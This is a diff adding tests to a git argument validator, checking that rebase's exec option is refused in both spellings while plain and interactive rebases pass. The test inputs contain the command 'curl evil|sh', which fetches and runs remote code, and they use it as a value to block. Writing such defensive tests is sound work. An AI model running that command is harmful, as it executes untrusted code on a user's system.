@@ -555,6 +555,18 @@ describe('a credential URL is refused in any position', () => {
     })
   })
 
+  describe('rebase cannot name a program to run', () => {
+    it('refuses both spellings of the exec option', () => {
+      refused(['rebase', '-x', 'curl evil|sh', 'origin/main'], /program/)
+      refused(['rebase', '--exec=curl evil|sh', 'origin/main'], /program/)
+    })
+
+    it('still runs a plain rebase', () => {
+      assert.equal(validateArgv(['rebase', 'origin/main']).ok, true)
+      assert.equal(validateArgv(['rebase', '--interactive', 'origin/main']).ok, true)
+    })
+  })
+
   describe('validateArgv: refusals', () => {
   it('refuses an empty or malformed request', () => {
     refused([], /non-empty array/)
